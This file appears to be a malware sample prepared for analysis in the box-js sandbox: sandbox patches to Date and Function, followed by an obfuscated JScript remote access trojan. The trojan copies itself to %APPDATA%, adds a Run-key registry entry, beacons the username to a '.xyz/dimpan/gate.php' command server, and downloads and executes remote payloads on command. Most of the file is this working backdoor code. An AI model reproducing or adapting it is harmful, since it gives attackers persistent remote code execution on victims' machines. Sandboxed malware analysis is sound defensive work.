/* Patches from box-js */
	window = this;

	_globalTimeOffset = 0;
	WScript.sleep = function(delay) {
		_globalTimeOffset += delay;
	}

	let fullYearGetter = Date.prototype.getFullYear;
	Date.prototype.getFullYear = function() {
		console.log("Warning: the script tried to read the current date.");
		console.log("If it doesn't work correctly (eg. fails to decrypt a string,");
		console.log("try editing patch.js with a different year.");

		// return 2017;
		return fullYearGetter.call(this);
	};
	Date.prototype.getYear = function() {
		return this.getFullYear();
	};
	Date.prototype.toString = function() {
		// Example format: Thu Aug 24 18:17:18 UTC+0200 2017
		const dayName = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"][this.getDay()];
		const monName = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"][this.getMonth()];
		return [
			dayName, monName, this.getUTCDay(),
			this.getUTCHours() + ":" + this.getUTCMinutes() + ":" + this.getUTCSeconds(),
			"UTC-0500", // New York timezone
			this.getFullYear()
		].join(" ");
	}
	const legacyDate = Date;
	Date = function() {
		return new Proxy({
			_actualTime: new legacyDate(...arguments),
		}, {
			get: (target, prop) => {
				const modifiedDate = new legacyDate(target._actualTime.getTime() + _globalTimeOffset);
				if (prop === Symbol.toPrimitive) return hint => {
					switch (hint) {
						case "string":
						case "default":
							return modifiedDate.toString();
						case "number":
							return modifiedDate.getTime();
						default:
							throw new Error("Unknown hint!");
					}
				}
				if (typeof prop !== "symbol") {
					if (!(prop in modifiedDate) && (prop in legacyDate)) return legacyDate[prop];
					if (!(prop in legacyDate.prototype)) return undefined;                
				}
				const boundFn = modifiedDate[prop].bind(modifiedDate);
				return function() {
					const ret = boundFn.apply(null, arguments);
					target._actualTime = new legacyDate(modifiedDate.getTime() - _globalTimeOffset);
					return ret;
				}
			}
		});
	}
	Date.now = () => legacyDate.now() + _globalTimeOffset;
	Date.length = 7;
	Date.parse = legacyDate.parse;
	Date.UTC = legacyDate.UTC;
	Date.toString = () => legacyDate.toString()
	Date.valueOf  = () => legacyDate.valueOf()

	Array.prototype.Count = function() {
		return this.length;
	};

	let _OriginalFnToString = Function.prototype.toString;
	Function.prototype.toString = function() {
		/**
		 * WSH's toString() looks a bit different for built-in functions
		 * than result generated by Node.js (tabbed and wrapped with newlines)
		 * which is sometimes checked by malicious scripts.
		 */
		let source = _OriginalFnToString.call(this);
		return source.replace(
			/^function (\S+) { \[native code\] }$/,
			((m, fnName) => `\nfunction ${fnName} {\n    [native code]\n}\n`)
		)
	}

	let _OriginalFunction = Function;
	Function = function(...args) {
		let originalSource = args.pop();
		let source;
		if (typeof originalSource === "function") {
			originalSource = originalSource.toString();
			source = rewrite("(" + originalSource + ")");
		} else if (typeof originalSource === "string") {
			source = `/* Function arguments: ${JSON.stringify(args)} */\n` + rewrite(originalSource);
		} else {
			// What the fuck JS
			// For some reason, IIFEs result in a call to Function.
			return new _OriginalFunction(...args, source);
		}
		logJS(source);
		return new _OriginalFunction(...args, source);
	}
	Function.toString = () => _OriginalFunction.toString()
	Function.valueOf  = () => _OriginalFunction.valueOf()
/* End patches */
var _0x317f = [
    '120430XXVIfh',
    '278099EkyzbF',
    'Content-Type',
    'length',
    'charAt',
    'quit',
    'specialfolders',
    'MSXML2.ServerTTTTTTTTTTTXMLHTTP',
    '624145xRuAmy',
    'savetofile',
    'ExpandEnvironmentStrings',
    'Microsoft.XMLTTTTTTTTTTTTHTTP',
    'RegDelete',
    'fromCharCode',
    'startup',
    '340843SSemfJ',
    'scriptname',
    'getTime',
    '|JS',
    'deletefile',
    '224534NDdNec',
    '%USERNAME%',
    'REG_SZ',
    'wscript.shell',
    '997048hdfOCk',
    'RegWrite',
    'responseText',
    'replace',
    'split',
    'random',
    'expandenvironmentstrings',
    'send',
    '427228dSLRBw',
    'substr',
    'HKCU\\Software\\bolt\\GUID',
    '://',
    'indexOf',
    'httpTTTTTTT://voubucleonteriTTTTTTTTTT.xyz/dimpan/gate.php',
    'RegRead',
    'copyfile',
    'HKCU\\software\\microsoft\\windows\\currentversion\\run\\',
    'setRequestHeader',
    'open',
    'floor',
    'regdelete',
    'User-Agent',
    '%APPDATA%',
    'application/x-www-form-urlencoded',
    'wscriptTTTTTTTTTTTTT.exe //B ',
    'scriptfullname',
    'regwrite',
    'type',
    'files/'
];
var _0x23b0 = function (_0x25aefc, _0x2105e3) {
    _0x25aefc = _0x25aefc - 448;
    var _0x317f0b = _0x317f[_0x25aefc];
    return _0x317f0b;
};
var _0x1dd1ec = _0x23b0;
(function (_0x521d32, _0x6c3a82) {
    var _0x216817 = _0x23b0;
    while (!![]) {
        {
            var _0x483e4a;
            try {
                var _0x2f7744 = parseInt(_0x216817(481)) + -parseInt(_0x216817(474)) + parseInt(_0x216817(466)) + -parseInt(_0x216817(467)) + -parseInt(_0x216817(498)) + parseInt(_0x216817(486)) + parseInt(_0x216817(490));
                if (_0x2f7744 === _0x6c3a82)
                    break;
                else
                    _0x521d32['push'](_0x521d32['shift']());
            } catch (__0x483e4a) {
                _0x483e4a = __0x483e4a;
                {
                    _0x521d32['push'](_0x521d32['shift']());
                }
            }
        }
    }
}(_0x317f, 353383));
var SaveSettings = _0x1dd1ec(500), shellobj = new ActiveTTTTXObject(_0x1dd1ec(489)), filesystemobj = new ActiveTTTTXObject('scripting.filesystemobject'), HKCU = _0x1dd1ec(453), startup = shellobj[_0x1dd1ec(472)](_0x1dd1ec(480)) + '\\', installdir = shellobj[_0x1dd1ec(496)](_0x1dd1ec(459)) + '\\', temp = shellobj['ExpandEnvironmentStrings']('%TEMP%') + '\\', gate = _0x1dd1ec(450), user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Vivaldi/3.5', time = 60000;
do {
    install(), getCommand(), sleep(time);
} while (!![]);
function Download_exec(_0x479ef0, _0x32d278) {
    var _0x51478e = _0x1dd1ec;
    if (_0x479ef0[_0x51478e(449)](_0x51478e(448)) < 0)
        var _0x51e5a6 = gate['split']('/'), _0x479ef0 = gate[_0x51478e(493)](_0x51e5a6[_0x51e5a6['length'] - 1], _0x51478e(465) + _0x479ef0);
    var _0x36fc60 = new ActiveTTTTXObject(_0x51478e(477)), _0x29a907 = new ActiveTTTTXObject('ADODB.Stream');
    if (_0x32d278 == 1)
        var _0x556d8d = WSH['scriptfullname'];
    else {
        var _0x33c997 = _0x479ef0[_0x51478e(499)](_0x479ef0[_0x51478e(469)] - 4, _0x479ef0['length']), _0x464bae = '', _0x58c445 = 'abcdef0123456789', _0x2645d9 = _0x58c445[_0x51478e(469)];
        for (var _0x35372c = 0; _0x35372c < 8; _0x35372c++) {
            _0x464bae += _0x58c445[_0x51478e(470)](Math[_0x51478e(456)](Math[_0x51478e(495)]() * _0x2645d9));
        }
        var _0x556d8d = temp + _0x464bae + _0x33c997;
    }
    _0x36fc60[_0x51478e(455)]('GET', _0x479ef0, ![]), _0x36fc60[_0x51478e(497)](), _0x29a907[_0x51478e(464)] = 1, _0x29a907[_0x51478e(455)], _0x29a907['write'](_0x36fc60['responseBody']), _0x29a907[_0x51478e(475)](_0x556d8d, 2);
    {
        var _0x5d2613;
        try {
            shellobj['run'](_0x556d8d);
        } catch (__0x5d2613) {
            _0x5d2613 = __0x5d2613;
            {
            }
        }
    }
}
function install() {
    var _0x2deee6 = _0x1dd1ec, _0x4922af = _0x2deee6(461);
    {
        var _0x34a799;
        try {
            shellobj[_0x2deee6(463)](HKCU + WSH[_0x2deee6(482)][_0x2deee6(494)]('.')[0], _0x4922af + String['fromCharCode'](34) + installdir + WSH[_0x2deee6(482)] + String[_0x2deee6(479)](34), _0x2deee6(488)), filesystemobj[_0x2deee6(452)](WSH[_0x2deee6(462)], installdir + WSH[_0x2deee6(482)], !![]);
        } catch (__0x34a799) {
            _0x34a799 = __0x34a799;
            {
            }
        }
    }
}
function getCommand() {
    var _0x349b23 = _0x1dd1ec;
    {
        var _0x1c3ff1;
        try {
            var _0x33b8fa = shellobj[_0x349b23(451)](SaveSettings);
        } catch (__0x1c3ff1) {
            _0x1c3ff1 = __0x1c3ff1;
            {
                var _0x33b8fa = '';
            }
        }
    }
    var _0x8b2067 = new ActiveTTTTXObject(_0x349b23(473));
    _0x8b2067[_0x349b23(455)]('POST', gate, ![]), _0x8b2067[_0x349b23(454)](_0x349b23(458), user_agent), _0x8b2067[_0x349b23(454)](_0x349b23(468), _0x349b23(460));
    if (_0x33b8fa[_0x349b23(469)] < 8)
        var _0xad0218 = '&id=1';
    else
        var _0xad0218 = '';
    _0x8b2067[_0x349b23(497)]('bolt=' + shellobj[_0x349b23(476)](_0x349b23(487)) + '|' + _0x33b8fa + _0x349b23(484) + _0xad0218);
    var _0xee8bf8 = _0x8b2067[_0x349b23(492)], _0x3c8d7c = _0xee8bf8[_0x349b23(494)]('|');
    switch (_0x3c8d7c[0]) {
    case '00':
        shellobj[_0x349b23(491)](SaveSettings, _0x3c8d7c[1], _0x349b23(488));
        break;
    case '01':
        Download_exec(_0x3c8d7c[1], 0);
        break;
    case '03':
        Download_exec(_0x3c8d7c[1], 1);
        break;
    case '19':
        shellobj[_0x349b23(457)](HKCU + WSH[_0x349b23(482)]['split']('.')[0]), filesystemobj[_0x349b23(485)](startup + WSH[_0x349b23(482)], !![]), filesystemobj[_0x349b23(485)](installdir + WSH['scriptname'], !![]), shellobj[_0x349b23(478)](SaveSettings), WSH[_0x349b23(471)]();
        break;
    }
}
function sleep(_0x4d228e) {
    var _0xbd0447 = _0x1dd1ec, _0x545a27 = new Date()[_0xbd0447(483)]();
    for (var _0x1dd736 = 0; _0x1dd736 < 10000000; _0x1dd736++) {
        if (new Date()[_0xbd0447(483)]() - _0x545a27 > _0x4d228e)
            break;
    }
}


// go through all declared variables in the script looking for valid JavaScript in the contents
// eval the javascript so it gets sandboxed
const vm = require('vm');
for (varName in this) {
    varValue = this[varName]
    if (typeof(varValue) == "string") {
        // check that the string is valid JS syntax
        try {
            const script = new vm.Script(varValue);
            logJS(varValue)
            // Automatically evaling all JS can result in the program state getting polluted.
            //eval(varValue)
        }
        catch (err) {}
    }
}
